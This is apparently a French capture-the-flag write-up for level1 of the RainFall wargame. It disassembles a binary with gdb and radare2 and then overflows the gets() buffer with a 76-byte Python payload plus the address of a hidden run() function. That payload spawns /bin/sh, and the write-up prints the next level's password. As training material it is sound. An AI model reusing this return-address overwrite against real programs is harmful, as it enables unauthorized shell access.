Le binaire ouvre un stream qui get notre input et le print a nouveau dans la sortie standare

Avec gdb on utilisera info functions pour regarder ce qu'il y a
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux
0x0804854c  _fini

On va maintenant disas avec radare2 le main et run

[0x08048390]> pdf @main
            ; DATA XREF from entry0 @ 0x80483a7
┌ 23: int main (int argc, char **argv, char **envp);
│           ; var char *s @ esp+0x10
│           0x08048480      55             push ebp
│           0x08048481      89e5           mov ebp, esp
│           0x08048483      83e4f0         and esp, 0xfffffff0
│           0x08048486      83ec50         sub esp, 0x50
│           0x08048489      8d442410       lea eax, [s]
│           0x0804848d      890424         mov dword [esp], eax        ; char *s
│           0x08048490      e8abfeffff     call sym.imp.gets           ; char *gets(char *s)
│           0x08048495      c9             leave
└           0x08048496      c3             ret


Ici dans le main run n'est jamais call

[0x08048390]> pdf @sym.run
┌ 60: sym.run ();
│           ; var size_t size @ esp+0x4
│           ; var size_t nitems @ esp+0x8
│           ; var FILE *stream @ esp+0xc
│           0x08048444      55             push ebp
│           0x08048445      89e5           mov ebp, esp
│           0x08048447      83ec18         sub esp, 0x18
│           0x0804844a      a1c0970408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│                                                                      ; [0x80497c0:4]=0
│           0x0804844f      89c2           mov edx, eax
│           0x08048451      b870850408     mov eax, str.Good..._Wait_what__n ; 0x8048570 ; "Good... Wait what?\n"
│           0x08048456      8954240c       mov dword [stream], edx     ; FILE *stream
│           0x0804845a      c74424081300.  mov dword [nitems], 0x13    ; [0x13:4]=-1 ; 19 ; size_t nitems
│           0x08048462      c74424040100.  mov dword [size], 1         ; size_t size
│           0x0804846a      890424         mov dword [esp], eax        ; const void *ptr
│           0x0804846d      e8defeffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
│           0x08048472      c70424848504.  mov dword [esp], str._bin_sh ; [0x8048584:4]=0x6e69622f ; "/bin/sh" ; const char *string
│           0x08048479      e8e2feffff     call sym.imp.system         ; int system(const char *string)
│           0x0804847e      c9             leave
└           0x0804847f      c3             ret

Dans run on remarque system qui prend une string contenant /bin/sh et donc qui ouvre un sh.

On va essayer de print l'addresse de run dans la zone ou segfault le programme. Pour ce faire on devra utiliser un nombre preci en terme de buffer + l'adresse a savoir que l'adresse = 4 bytes


Dans le main on vois que la valeur 80 est sub a esp, esp est ici le param recuperer dans le stream. Donc on suppose que le param ne doit pas deppasser 80.

level1@RainFall:~$ python -c 'print "o" * 80' > /tmp/run1
level1@RainFall:~$ cat /tmp/run1 - | ./level1

Segmentation fault (core dumped)

Ca segfault. On va donc rajouter l'adresse. Mais comme elle est d'une valeur de 4 bytes on le prendra en compte dans notre attaque

level1@RainFall:~$ python -c 'print "o" * 76 + "\x44\x84\x04\x08"' > /tmp/run1
level1@RainFall:~$ cat /tmp/run1 - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
